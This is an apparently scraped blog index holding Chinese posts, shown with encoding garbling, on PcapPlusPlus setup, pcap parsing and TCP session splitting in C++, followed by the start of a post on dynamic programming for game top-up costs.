\u0026lt;\u0026lt; \u0026#34;Start\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;End\u0026#34;\u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Duration\u0026#34; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; ipLayer-\u0026gt;getSrcIPv4Address().toString() \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; ipLayer-\u0026gt;getDstIPv4Address().toString() \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; tcpLayer-\u0026gt;getSrcPort() \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; tcpLayer-\u0026gt;getDstPort(); double startTime = sessionStart-\u0026gt;second.tv_sec + (double)sessionStart-\u0026gt;second.tv_nsec / 1e9; double endTime = rawPacket.getPacketTimeStamp().tv_sec + (double)rawPacket.getPacketTimeStamp().tv_nsec / 1e9; cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; sessionStart-\u0026gt;second.tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; rawPacket.getPacketTimeStamp().tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; setprecision(5) \u0026lt;\u0026lt; (endTime - startTime) \u0026lt;\u0026lt; endl; sessionMap.erase(sessionStart); outputCount++; } } } auto END = clock(); cout \u0026lt;\u0026lt; \u0026#34;Total time: \u0026#34; \u0026lt;\u0026lt; double(END - BEGIN) / CLK_TCK * 1000 \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Total sessions: \u0026#34; \u0026lt;\u0026lt; outputCount \u0026lt;\u0026lt; endl; reader-\u0026gt;close(); delete reader; return 0; } è¿™æ¬¡ä»£ç ä½œå‡ºçš„æ”¹å˜ä¸»è¦æœ‰ï¼š\nä½¿ç”¨ uint32_t keyTuple = hash5Tuple(\u0026amp;parsedPakcet); æ¥è¡¨ç¤ºä¼šè¯å…ƒç»„ï¼Œæ—¢èŠ‚çœç©ºé—´ï¼ˆåŸå…ˆçš„ String è¶…çº§å¤§ï¼‰åˆèŠ‚çœæ—¶é—´ï¼ˆæŠŠ String å½“åšé”®å€¼ï¼Œæ¯”è¾ƒèµ·æ¥å¾ˆæ…¢ï¼‰ï¼› é‡æ–°è€ƒè™‘ä¼šè¯èµ·æ­¢çš„ç®—æ³•ã€‚ä¼šè¯èµ·ç‚¹ä¸ºå¸¦æœ‰ SYN ä½†ä¸å¸¦ ack çš„åŒ…ï¼Œä¼šè¯ç»ˆç‚¹ä¸ºç¬¬äºŒä¸ª FIN åŒ…ï¼›åœ¨åæœŸè§‚å¯Ÿæ—¶ï¼Œå‘ç° ä¼šè¯ç»ˆç‚¹è¿˜å¯ä»¥æ˜¯ RST åŒ… ã€‚ è¿è¡Œç»“æœ ç»“æœä¸åã€‚ä»æ—¶é—´ä¸Šçœ‹ï¼ŒåŸºæœ¬ä¸Šæ¯”ä¹‹å‰çš„åˆ‡åˆ†æ–¹å¼å¿«äº†ä¸€å€ã€‚\nä¸WireSharkç»Ÿè®¡ç»“æœçš„å¯¹æ¯” ç¨‹åºè®¡ç®—å‡ºæ¥çš„ç»“æœæ˜¯ 163 ä¸ªå®Œæ•´ä¼šè¯ï¼Œè€ŒWireSharkçš„ç»Ÿè®¡ç»“æœæ˜¯ 221 ä¸ªä¼šè¯ï¼š\nWireSharkâ€“Statisticsâ€“Conversations ä½†æ˜¯å°†è¿™äº›ä¼šè¯æŒ‰ç…§å­—èŠ‚å¤§å°æ’åºï¼Œè·Ÿè¸ªå‰é¢çš„æ¯”è¾ƒå°çš„ä¼šè¯ï¼Œå‘ç°è¿™äº›ä¼šè¯å¹¶ä¸å®Œæ•´ï¼š\nä¸å®Œæ•´çš„ä¼šè¯ æˆ‘æ¨æµ‹WireSharkä»…ä»…æ˜¯æ ¹æ®äº”å…ƒç»„æ¥è¿›è¡Œç»Ÿè®¡ï¼Œæ ¹æœ¬æ²¡æœ‰å»è€ƒè™‘ä¼šè¯çš„å®Œæ•´æ€§ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ hash5Tuple() ï¼Œè®¡ç®—å‡ºæ¥çš„æ¯ä¸€ä¸ª uint_32 å€¼éƒ½è¡¨ç¤ºä¸€ä¸ªä¼šè¯ï¼Œé‚£ä¹ˆç»“æœè·ŸWireSharkçš„ç»Ÿè®¡åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚\nç®€å•åœ¨ä»£ç ä¸­æ·»åŠ ä¸€ä¸ªè®°å½•è¿™äº›äº”å…ƒç»„çš„é›†åˆ set\u0026lt;uint32_t\u0026gt; tupleSet; ï¼Œç„¶åæ¯è®¡ç®—ä¸€ä¸ªå“ˆå¸Œå€¼å°±å¾€é‡Œæ”¾ï¼Œæœ€åæ‰“å°ä¸€ä¸‹ï¼š\ntupleSet.size() æœä¸å…¶ç„¶ï¼\nWireSharkè¿™ç§ç»Ÿè®¡æ–¹å¼æ²¡ä»€ä¹ˆç”¨å•¦ï¼ä¸€ä¸ªæ²¡å¤´æ²¡å°¾çš„æ•°æ®æ®µèƒ½ä»£è¡¨ä»€ä¹ˆå‘¢ï¼Ÿè¿˜æ˜¯æŒ‰ç…§ä¹‹å‰æåˆ°çš„æ–¹æ³•æ¥è¡¨ç¤ºä¸€ä¸ªä¼šè¯ï¼Œè¿™æ ·ç²¾ç¡®ä¸€ç‚¹ï¼\nå‚è€ƒèµ„æ–™ [1] 4. Packet Parsing - PcapPlusPlus\n[2] 1. Introduction - PcapPlusPlus\n[3] PcapPlusPlus: API Documentation\n[4] ä¸€ç«™å¼å­¦ä¹ Wiresharkï¼ˆä¸ƒï¼‰ï¼šStatisticsç»Ÿè®¡å·¥å…·åŠŸèƒ½è¯¦è§£ä¸åº”ç”¨ - zhuimeng~ - åšå®¢å›­ (cnblogs.com)\n[5] PcapPlusPlus/Examples/PcapSplitter at master Â· seladb/PcapPlusPlus (github.com)\n","date":"2022-02-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/pcapplusplus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95%E4%BA%8C%E9%80%9A%E8%BF%87%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E5%8C%85%E5%AE%9E%E7%8E%B0%E4%BC%9A%E8%AF%9D%E5%88%86%E5%89%B2/","title":"PcapPlusPlusä½¿ç”¨è®°å½•ï¼ˆäºŒã€é€šè¿‡è§£ææ•°æ®åŒ…å®ç°ä¼šè¯åˆ†å‰²ï¼‰"},{"content":"ç®€ä»‹ ç”±äºé¡¹ç›®çš„éœ€è¦ï¼Œè¿‘æœŸäº§ç”Ÿäº†ä¸€ä¸ªéœ€æ±‚ï¼šå°†ä¸€ä¸ª pacp æ–‡ä»¶è§£æå‡ºæ¥ï¼Œç„¶åå°è¯•æå–æ¯ä¸ªè¿æ¥çš„å„ç§ç»Ÿè®¡æ•°æ®ï¼Œä¾‹å¦‚æå–ä¸€ä¸ªå®Œæ•´çš„TCPä¼šè¯ä¸­çš„æºIPã€ç›®çš„IPã€æºç«¯å£ã€ç›®çš„ç«¯å£ã€ä¼šè¯å¼€å§‹æ—¶é—´ã€ä¼šè¯ç»“æŸæ—¶é—´ã€å‘é€çš„æ•°æ®åŒ…æ•°é‡ã€å‘é€çš„æ•°æ®åŒ…æ€»å¤§å°ç­‰ç­‰ã€‚\nèƒ½å¤Ÿå®ç°è¿™ä¸€éœ€æ±‚çš„åº“æœ‰å¾ˆå¤šï¼Œå¦‚pythonä¸­çš„ scapy ã€ dpkt ï¼ŒC++ä¸­çš„ PcapPlusPlus ç­‰ï¼Œè€ƒè™‘åˆ°å°†æ¥å¯èƒ½éœ€è¦å¤„ç†è¾ƒå¤§çš„ pcap æ–‡ä»¶ï¼Œä»¥åŠC++ç›¸æ¯”äºpythonåœ¨æ‰§è¡Œé€Ÿåº¦ä¸Šçš„ä¼˜åŠ¿ï¼Œæˆ‘å†³å®šä½¿ç”¨C++ä½œä¸ºæµé‡å¤„ç†çš„è¯­è¨€ï¼›ç®€å•ç¿»é˜…äº†ä¸€ä¸‹ PcapPlusPlusçš„æ–‡æ¡£ ï¼Œæˆ‘è®¤ä¸ºè¿™ä¸ªåº“çš„æ˜“ç”¨æ€§èƒ½å¤Ÿæ»¡è¶³æˆ‘è¾ƒä½çš„æ°´å¹³ï¼Œå› æ­¤å†³å®šå…ˆå®è·µä¸€ä¸‹å†è¯´ã€‚\né¢„è£…ä¾èµ– ä»è¿™é‡Œå¼€å§‹ï¼Œæˆ‘æƒ³å°† PcapPlusPlus ç®€ç§°ä¸º PCPP ï¼Œæ–¹ä¾¿æ–‡ç« çš„æ’°å†™ä¹‹ç”¨ ã€‚\næœ¬æ–‡ä½¿ç”¨çš„ç¯å¢ƒæ˜¯ï¼šWin10 + VisualStudio2019 ã€‚\nè¦ä½¿ç”¨è¿™ä¸ªåº“ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå®‰è£…ä¸€äº›ä¾èµ–ã€‚\nä¸ªäººå»ºè®®å°†è¿™äº›ä¾èµ–ä¸‹è½½åˆ°åŒä¸€ä¸ªåœ°æ–¹ï¼Œæ–¹ä¾¿ç®¡ç†ï¼\nå®‰è£… WinPcapå¼€å‘è€…å·¥å…· æˆ– Npcap SDK ã€‚ä¸‹è½½è§£å‹è€Œå·²ï¼Œå¾ˆç®€å•ï¼æˆ‘è¿™è¾¹ä½¿ç”¨çš„æ˜¯WinPcap ã€‚ å®‰è£… pthread-win32å·¥å…· ï¼Œæ³¨æ„è¿™é‡Œçš„é“¾æ¥è·ŸPCPPæ–‡æ¡£é‡Œé¢çš„é“¾æ¥æ˜¯ä¸ä¸€æ ·çš„ï¼æ–‡æ¡£é‡Œé¢çš„URLåè®®æ˜¯ ftp ï¼Œæˆ‘ä¸‹è½½çš„æ—¶å€™å¥½åƒæ‰“ä¸å¼€çš„æ ·å­ï¼Œå°±æ”¹ä¸ºä½¿ç”¨ https äº†ï¼ å¯èƒ½è¿˜éœ€è¦ä¸€ä¸ª Microsoft Visual C++ Redistributable å·¥å…·ï¼Œä»è¿™é‡Œä¸‹ä¸‹æ¥çš„æ˜¯ä¸ª exe æ–‡ä»¶ï¼Œæˆ‘åœ¨åé¢çš„è¿‡ç¨‹ä¸­ æš‚æ—¶æ²¡æœ‰ç”¨åˆ° ï¼ä¹Ÿå°±æ˜¯è¯´æˆ‘è¿˜æ²¡è¿è¡Œè¿‡è¿™ä¸ªEXEï¼Œå…ˆä¸‹è½½ä¸‹æ¥è€Œå·²ï¼ ä¸‹è½½PcapPlusPlus ç›´æ¥ä» PcapPlusPlus v21.11 é¡µé¢ä¸ŠæŠŠç¤ºä¾‹ä»£ç ä¸‹è½½ä¸‹æ¥ï¼æˆ‘è¿™è¾¹é€‰ç”¨çš„æ˜¯ windows-vs2019 è¿™ä¸ªå‹ç¼©åŒ…ï¼\nåˆ°è¿™ä¸€æ­¥ï¼Œç®—ä¸Šæˆ‘ä»¬ä¹‹å‰ä¸‹è½½ å¹¶è§£å‹ çš„ä¾èµ–ï¼Œæ–‡ä»¶å¤¹é‡Œé¢åº”è¯¥æœ‰è¿™ä¹ˆå¤šä¸œè¥¿ï¼š\nç°æœ‰çš„æ–‡ä»¶ All rightï¼Ÿè¿›å…¥åˆšæ‰ä¸‹è½½çš„VS2019æ–‡ä»¶å¤¹é‡Œé¢ï¼Œæœ‰ä¸ª ExampleProject ï¼Œæ‰“å¼€ä¹‹ï¼š\nExampleProjectæ–‡ä»¶ç»“æ„ æ²¡é—®é¢˜çš„è¯ï¼Œå°±å‡†å¤‡è¿è¡Œç¤ºä¾‹ç¨‹åºäº†ï¼\nè¿è¡Œç¤ºä¾‹ç¨‹åº ç†Ÿæ‚‰VSçš„æœ‹å‹å¯èƒ½è¦è¿«ä¸åŠå¾…åœ°æŠŠé‚£ä¸ª .sln æ–‡ä»¶ç»™æ‰“å¼€äº†~ä¸è¦å¿ƒæ€¥ï¼\né¦–å…ˆæˆ‘ä»¬åº”è¯¥ä¿®æ”¹ .props æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨æ¥æŒ‡å®šé¡¹ç›®é‡Œé¢çš„ä¸€äº›å±æ€§çš„ï¼›å…·ä½“åœ°è¯´ï¼Œå…¶å®å°±æ˜¯æŒ‡å®šåˆšæ‰ä¸‹è½½çš„å‡ ä¸ªä¾èµ–çš„è·¯å¾„è€Œå·²ï¼å¦‚æœä¸ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ï¼Œè´¸ç„¶æ‰“å¼€ .sln ï¼Œé‚£å¿…ç„¶æ˜¯è¦æŠ¥é”™çš„ï¼\næœ€åŸå§‹çš„ .props æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Project ToolsVersion=\u0026#34;4.0\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/developer/msbuild/2003\u0026#34;\u0026gt; \u0026lt;ImportGroup Label=\u0026#34;PropertySheets\u0026#34; /\u0026gt; \u0026lt;PropertyGroup Label=\u0026#34;UserMacros\u0026#34;\u0026gt; \u0026lt;PcapPlusPlusHome\u0026gt;Drive:\\your\\PcapPlusPlus\\folder\u0026lt;/PcapPlusPlusHome\u0026gt; \u0026lt;PcapSdkHome\u0026gt;Drive:\\WpdPack\\folder\u0026lt;/PcapSdkHome\u0026gt; \u0026lt;PThreadWin32Home\u0026gt;Drive:\\pthread-win32\\folder\u0026lt;/PThreadWin32Home\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;PropertyGroup /\u0026gt; \u0026lt;ItemDefinitionGroup /\u0026gt; \u0026lt;ItemGroup /\u0026gt; \u0026lt;/Project\u0026gt; çœ‹åˆ°å—ï¼Ÿè¿™ä¸ªæ–‡ä»¶æŒ‡å®šä¸‰ä¸ªå…³é”®è·¯å¾„ï¼š\nPcapPlusPlusHome ï¼šå°±æ˜¯åˆšæ‰è§£å‹å‡ºæ¥çš„PCPPç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç°åœ¨è¿™ä¸ª ExampleProject çš„ä¸Šçº§ç›®å½•ï¼ PcapSdkHome ï¼šç”¨äºå¤„ç† pcap æ–‡ä»¶çš„SDKå·¥å…·çš„ç›®å½•ï¼Œåœ¨ é¢„è£…ä¾èµ– å°èŠ‚é‡Œé¢æˆ‘ä»¬ä¸‹è½½äº†WinPcapï¼Œè¿˜è®°å¾—å—ï¼ŸæŠŠå®ƒçš„è·¯å¾„å†™åœ¨è¿™é‡Œå³å¯ï¼å¦‚æœä½ é€‰ç”¨çš„æ˜¯Npcapï¼Œé“ç†ä¹Ÿä¸€æ ·~ PThreadWin32Home ï¼šå¤šçº¿ç¨‹åº“ï¼æŠŠpthreadè·¯å¾„å¡«è¿›å»å§ ğŸ˜€ åœ¨æˆ‘çš„PCä¸Šï¼Œä¿®æ”¹å®Œæˆä¹‹åè¿™ä¸ªæ–‡ä»¶å·®ä¸å¤šæ˜¯è¿™æ ·ï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Project ToolsVersion=\u0026#34;4.0\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/developer/msbuild/2003\u0026#34;\u0026gt; \u0026lt;ImportGroup Label=\u0026#34;PropertySheets\u0026#34; /\u0026gt; \u0026lt;PropertyGroup Label=\u0026#34;UserMacros\u0026#34;\u0026gt; \u0026lt;PcapPlusPlusHome\u0026gt;E:\\PcapPlusPlus\\pcapplusplus-21.11-windows-vs2019\u0026lt;/PcapPlusPlusHome\u0026gt; \u0026lt;PcapSdkHome\u0026gt;E:\\PcapPlusPlus\\WpdPack\u0026lt;/PcapSdkHome\u0026gt; \u0026lt;PThreadWin32Home\u0026gt;E:\\PcapPlusPlus\\pthreads-w32-2-9-1-release\u0026lt;/PThreadWin32Home\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;PropertyGroup /\u0026gt; \u0026lt;ItemDefinitionGroup /\u0026gt; \u0026lt;ItemGroup /\u0026gt; \u0026lt;/Project\u0026gt; ä¹‹åï¼Œå°±å¯ä»¥æ‰“å¼€ .sln æ–‡ä»¶äº†ï¼ç¤ºä¾‹é¡¹ç›®å³åˆ»å‡ºç°ï¼\nmain.cpp ç®€å•ä½¿ç”¨PcapPlusPlusè§£æäº†ä¸€ä¸‹ç¤ºä¾‹é¡¹ç›®é‡Œé¢çš„ 1_packet.pcap æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åªæœ‰ä¸€ä¸ªæ•°æ®åŒ…ï¼Œç¨‹åºæŠŠæºIPå’Œç›®çš„IPè¾“å‡ºäº†ä¸€ä¸‹è€Œå·²ï¼\nç›´æ¥ç¼–è¯‘è¿è¡Œå³å¯ï¼š\nè¿è¡Œç»“æœ ç®€å•ä½¿ç”¨PCPPå¤„ç†pcapæ–‡ä»¶ åˆšæ‰è¿è¡Œçš„ç¤ºä¾‹æœªå…å¤ªç®€å•ï¼Œå¾ˆéš¾ä½“ç°å‡ºå’±ä»¬è¿™ä¸ªåº“çš„æ½œåŠ›ï¼\nåœ¨è¿™ä¸€å°èŠ‚ï¼Œæˆ‘å¸Œæœ›ä½¿ç”¨è¿™ä¸ªåº“ç®€å•å¤„ç†ä¸€ä¸‹æˆ‘ä¹‹å‰æ•è·çš„ä¸€ä¸ª pcap æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«ä¸¤ä¸‡å¤šæ¡æ•°æ®ï¼Œå…¶å®ä¹Ÿè¿˜ä¸ç®—å¾ˆå¤§ã€‚\ntest_file_1.pcap å…ˆæŠŠä»£ç è´´å‡ºæ¥ï¼Œå†æ…¢æ…¢è§£é‡Šå§~\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; #include \u0026lt;set\u0026gt; #include \u0026lt;ctime\u0026gt; int main(int argc, char* argv[]) { // Part 1 // open a pcap file for reading pcpp::IFileReaderDevice* reader = pcpp::IFileReaderDevice::getReader(\u0026#34;test_file_1.pcap\u0026#34;); if (!reader) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } if (!reader-\u0026gt;open()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Part 2 if (!reader-\u0026gt;setFilter(\u0026#34;tcp and port 80\u0026#34;)) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot set filter for file reader\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // Part 3 pcpp::RawPacket rawPacket; std::set\u0026lt;std::string\u0026gt; dstIPSet; clock_t BEGIN = clock(); while (reader-\u0026gt;getNextPacket(rawPacket)) { pcpp::Packet parsedPacket(\u0026amp;rawPacket); if (parsedPacket.isPacketOfType(pcpp::IPv4)) { pcpp::IPv4Address dstIP = parsedPacket.getLayerOfType\u0026lt;pcpp::IPv4Layer\u0026gt;()-\u0026gt;getDstIPv4Address(); if (dstIPSet.count(dstIP.toString()) == 0) dstIPSet.insert(dstIP.toString()); } } clock_t END = clock(); // Part 4 std::cout \u0026lt;\u0026lt; \u0026#34;There are total \u0026#34; \u0026lt;\u0026lt; dstIPSet.size() \u0026lt;\u0026lt; \u0026#34; destination IP address.\\n\u0026#34;; std::cout \u0026lt;\u0026lt; \u0026#34;Total time: \u0026#34; \u0026lt;\u0026lt; double(END - BEGIN) / CLK_TCK * 1000 \u0026lt;\u0026lt; \u0026#34; ms.\\n\u0026#34;; // Part 5 reader-\u0026gt;close(); delete reader; return 0; } æ ¹æ® å‚è€ƒèµ„æ–™[4] ï¼Œæˆ‘ä»¬è¿™æ¬¡ä½¿ç”¨çš„ reader è·Ÿåˆšæ‰ç¤ºä¾‹ä»£ç ä½¿ç”¨çš„ä¸å¤ªä¸€æ ·ï¼Œç”¨çš„æ˜¯ IFileReaderDevice é‡Œé¢çš„ getReader() APIï¼Œå®ƒä¼šæ ¹æ®æ–‡ä»¶åæ¥ä¸ºæˆ‘ä»¬è¿”å›åˆé€‚çš„Readerï¼ä»£ç é‡Œé¢çš„ Part 1 å°±æ˜¯åœ¨å¹²è¿™ä¸ªäº‹æƒ…è€Œå·²ï¼Œåˆ›å»ºä¸€ä¸ªåˆé€‚çš„Readerï¼Œç„¶åæ‰“å¼€å®ƒï¼Œå‡†å¤‡è¯»å–æ–‡ä»¶äº†ï¼\nç´§æ¥ç€ï¼Œæˆ‘ä¸ºè¿™ä¸ªReaderè®¾ç½®äº†ä¸€ä¸ªè¿‡æ»¤å™¨ã€‚ reader-\u0026gt;setFilter(\u0026quot;tcp and port 80\u0026quot;) è¡¨æ˜æˆ‘åªå¸Œæœ›è¯»å–åè®®ä¸ºTCPçš„ã€ä¸”ç«¯å£ä¸º 80 çš„æ•°æ®åŒ…ï¼Œå…¶å®ƒçš„æ•°æ®åŒ…ï¼ˆå¦‚ICMPã€UDPç­‰ç­‰ï¼‰æˆ‘å°±ä¸å…³å¿ƒäº†ã€‚è¿™ä¸ª setFilter åœ¨å°†æ¥çš„åœºæ™¯é‡Œé¢åº”è¯¥æ˜¯è›®æœ‰ç”¨çš„ï¼Œå®ƒä½¿ç”¨çš„æ˜¯ Berkeley Packet Filter (BPF) syntax ã€‚\næ¥åˆ° Part 3 ä¹‹åï¼Œå¼€å§‹åˆ†ææˆ‘ä»¬è¯»åˆ°çš„æ•°æ®ã€‚è¿‡æ»¤å™¨æ˜¯TCPåè®®å’Œ 80 ç«¯å£ï¼Œå…¶å®æˆ‘ä»¬è¯»å–çš„å°±æ˜¯å‘å¾€æŸä¸ªWebæœåŠ¡çš„è¯·æ±‚è€Œå·²ï¼æˆ‘ç”¨äº†ä¸€ä¸ªé›†åˆ dstIPSet æ¥è®°å½•ç›®çš„IPï¼Œæ‰“ç®—å¾…ä¼šçœ‹çœ‹æ€»å…±æœ‰å¤šå°‘ä¸åŒçš„ç›®çš„ä¸»æœº ğŸ˜¹ ä½¿ç”¨ while å¾ªç¯æ¥è¯»å–æ•°æ®åŒ…ï¼Œä½¿ç”¨ parsedPacket æ¥è§£ææ•°æ®åŒ…ï¼Œç„¶åè·å–æ•°æ®åŒ…é‡Œé¢çš„IPv4åœ°å€ï¼ŒæŠŠå®ƒæ”¾åˆ°é›†åˆé‡Œé¢ï¼\nPart 3 æœ‰ä¸ªå°ç‚¹ç¼€ï¼Œå°±æ˜¯åœ¨å¾ªç¯å¤–é¢è®¾ç½®äº†ä¸¤ä¸ª clock_t ï¼Œç›®çš„æ˜¯æµ‹è¯•ä¸€ä¸‹æ•´ä¸ªå¾ªç¯è¦èŠ±å¤šé•¿æ—¶é—´ï¼\nPart 4 å°±æ˜¯æˆ‘ä»¬çš„è¾“å‡ºå•¦ï¼š\noutput result Part 5 è¿˜æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œè¦æŠŠåŠ³è‹¦åŠŸé«˜çš„Readerå…³æ‰ã€è¿˜è¦é‡Šæ”¾å®ƒçš„ç©ºé—´å•Šï¼åˆšå¼€å§‹ç¼–å†™è¿™ä¸ªç¨‹åºçš„æ—¶å€™æˆ‘ç»™å¿˜äº†ï¼Œç½ªè¿‡ç½ªè¿‡~ç”±äºPCPPçš„è¿™ä¸ª IFileReaderDevice æ˜¯åŠ¨æ€åˆ†é…çš„ï¼Œå¦‚æœä¸æŠŠå®ƒ delete æ‰çš„è¯ä¼šå‘ç”Ÿå†…å­˜æ³„éœ²å‘€ï¼\nå‚è€ƒèµ„æ–™ [1] Quick Start - Visual Studio - PcapPlusPlus\n[2] Build on Windows (VS) - PcapPlusPlus\n[3] ã€ŠPCAPã€‹ç¬¬1æœŸï¼ˆ1ï¼‰ï¼šPcapPlusPlusç¤ºä¾‹ç¨‹åºVS2015é…ç½® - çŸ¥ä¹ (zhihu.com)\n[4] 2. Read/Write Pcap Files - PcapPlusPlus\n","date":"2022-02-05T00:00:00Z","permalink":"https://xrg.fj.cn/p/pcapplusplus%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95%E4%B8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","title":"PcapPlusPlusä½¿ç”¨è®°å½•ï¼ˆä¸€ã€ç¯å¢ƒæ­å»º\u0026ç®€å•ä½¿ç”¨ï¼‰"},{"content":"æ•´æ´»ç®€ä»‹ ä»Šå¤©æ˜¯å†œå†é™¤å¤•ï¼Œç‹è€…è£è€€ä¸€å¹´ä¸€åº¦çš„ å‰²éŸ­èœ å¹´é™çš®è‚¤åˆä¸Šåœºäº†ã€‚\næ‰“å¼€æ¸¸æˆï¼Œè¿›å…¥å……å€¼é¡µé¢ï¼Œå¼€å†²ï¼\nå—¯ï¼Ÿç­‰ç­‰ï¼Œå¥½åƒè¦ç ´è´¹ï¼Ÿï¼\nè™½ç„¶APP Storeæœ‰å……å€¼èµ é€æœºåˆ¶ï¼Œä½†å½“æˆ‘éœ€è¦çš„ç›®æ ‡æ•°é¢å¤šèµ·æ¥æ—¶ï¼Œæ€ä¹ˆè·å–æœ€ä¼˜åŒ–çš„å……å€¼æ–¹æ¡ˆå‘¢ï¼Ÿä¼¼ä¹æ˜¯ä¸ªæœ‰è¶£çš„é—®é¢˜ ğŸ˜¼\næ‰€è°“ æœ€ä¼˜åŒ–çš„å……å€¼æ–¹æ¡ˆ ï¼Œå³æ˜¯æŒ‡ä¸¤ç§æƒ…å†µï¼š\nèŠ±è´¹æœ€å°‘çš„é’±ï¼Œè·å–ç›®æ ‡æ•°é¢çš„ç‚¹åˆ¸ï¼› åœ¨ä¸€å®šé‡çš„èŠ±é”€ä¸‹ï¼Œè·å–æœ€å¤šçš„ç‚¹åˆ¸ã€‚ è¿™ä¸¤ç§æƒ…æ™¯ä¸ä¸€æ ·å“ˆï¼ç¬¬ä¸€ä¸ªæ˜¯åœ¨æ»¡è¶³è´­ä¹°éœ€æ±‚çš„æƒ…å†µä¸‹å°½å¯èƒ½å°‘åœ°èŠ±é’±ï¼ç¬¬äºŒä¸ªæ˜¯åœ¨é¢„ç®—æœ‰é™çš„æƒ…å†µä¸‹å°½å¯èƒ½å¤šåœ°ä¹°åˆ°ç‚¹åˆ¸ï¼\nAPP Storeå……å€¼æ–¹æ¡ˆ åœºæ™¯ä¸€ã€è´­ä¹°ä¸€å®šç‚¹åˆ¸ï¼Œè®¡ç®—æœ€å°‘èŠ±é”€ åœºæ™¯ä¸€å°±æ˜¯å½“æˆ‘ä»¬éœ€è¦ä¸€å®šæ•°é‡çš„ç‚¹åˆ¸æ—¶ï¼Œè®¡ç®—æœ€å°‘çš„èŠ±é”€æ˜¯å¤šå°‘ï¼è¿™ä¸ªåœºæ™¯å¾ˆæœ‰æ„ä¹‰ï¼å› ä¸ºåœ¨å……é’±çš„æ—¶å€™ï¼Œå¤§å¤šæ•°æƒ…å†µå°±æ˜¯è¿™ä¸ªåœºæ™¯ï¼æˆ‘ä»¬ä¸ä¼šå»è€ƒè™‘è¿™æ¬¡è¦å†²å¤šå°‘é’±ï¼Œè€Œæ˜¯é¦–å…ˆè€ƒè™‘è¿™æ¬¡è¦ä¹°çš„æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚\næ—¢ç„¶æ–‡ç« æ ‡é¢˜éƒ½å·²ç»ç‚¹æ˜äº†æˆ‘çš„ç”¨æ„ï¼Œé‚£å°±ç›´æ¥ä»DPçš„è§’åº¦å¼€å§‹æ€è€ƒäº† ğŸ˜\nä»¤ dp[i] è¡¨ç¤º è´­ä¹° i ç‚¹åˆ¸çš„æœ€å°‘èŠ±é”€ ï¼Œé‚£ä¹ˆå¯¹äºç›®æ ‡ç‚¹åˆ¸ i ï¼Œå®ƒå¯ä»¥ç”±ä¸Šå›¾ä¸­æ‰€æœ‰å¯èƒ½çš„æ–¹æ¡ˆç»„æˆã€‚ä¾‹å¦‚æˆ‘ä»¬éœ€è¦è´­ä¹° 1430 ç‚¹åˆ¸ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥èŠ±è´¹è‹¥å¹²ä¸ª 1ï¿¥ è´­ä¹°è‹¥å¹²ä»½ 10ç‚¹åˆ¸ ï¼Œä¹Ÿå¯ä»¥èŠ±è´¹ä¸¤ä¸ª 68ï¿¥ è´­ä¹°ä¸¤ä»½ 715(680+35)ç‚¹åˆ¸ ã€‚å”¯ä¸€çš„é™åˆ¶æ˜¯ï¼Œä¸èƒ½ä½¿ç”¨æ¯” i æ›´å¤§çš„è´­ä¹°æ–¹æ¡ˆï¼Œä¾‹å¦‚æˆ‘ä»¬éœ€è¦ 1430 ç‚¹åˆ¸ï¼Œé‚£å°±ä¸èƒ½èŠ±è´¹ 648ï¿¥ 